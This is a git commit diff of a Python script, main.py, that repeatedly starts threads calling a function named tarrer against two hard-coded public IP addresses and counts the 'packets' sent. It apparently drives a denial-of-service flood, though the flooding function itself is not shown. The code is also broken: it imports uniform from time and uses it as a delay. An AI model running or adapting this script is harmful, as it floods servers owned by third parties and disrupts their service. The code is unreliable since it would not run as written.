1522bc021f7126790a9b1e302ad2b9aae23994a4
alialiearan-cell <ali.aliearan@gmail.com>
2025-09-08 23:28:19 +0330

    Update_to_start main.py

--- main.py
+++ main.py
@@ -1,14 +1,12 @@
 import test
 import threading
-from time import sleep
-from datetime import datetime
-now = datetime.now()
-with open("runner.txt","w") as f:
-    f.write(f"run in :\nminute:{now.minute}\nsecond:{now.second}")
-for count in range(10):
-    with open("test.txt","a") as f:
-        f.write(f"\n run new thread : {count}\nnumber send packet : {test.i}")
+from time import uniform
+a = 0
+while True:
     threading.Thread(target=test.tarrer,args=("104.18.147.40",)).start()
-    sleep(5)
-    
-print("finish all code")
+    threading.Thread(target=test.tarrer,args=("104.18.146.40",)).start()
+    uniform(1,2.5)
+    if a == 100:
+        break
+    a += 1 
+print(f"finish all code\nsended packet:{test.i}")
